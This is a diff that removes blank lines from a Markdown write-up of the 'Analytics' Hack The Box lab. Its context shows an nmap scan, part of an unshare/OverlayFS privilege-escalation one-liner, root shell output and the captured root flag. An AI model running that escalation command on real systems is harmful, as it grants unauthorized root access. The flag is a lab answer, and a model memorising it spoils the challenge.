@@ -32,7 +32,6 @@ Analytics is an easy difficulty Linux machine with exposed HTTP and SSH services
 ## Nmap
 
 ```bash
-
 # Nmap 7.94 scan initiated Sun Oct  8 08:48:32 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p- analytics.htb
 Increasing send delay for 10.129.49.172 from 0 to 5 due to 11 out of 21 dropped probes since last increase.
 Nmap scan report for analytics.htb (10.129.49.172)
@@ -55,7 +54,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sun Oct  8 08:55:40 2023 -- 1 IP address (1 host up) scanned in 428.10 seconds
 ```
 
@@ -415,10 +413,8 @@ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b
 ```
 
 ```bash
-
 # id
 uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
-
 # cat /root/root.txt
 645d9a7d91244c7d8581b188e7f1fa70
 ```
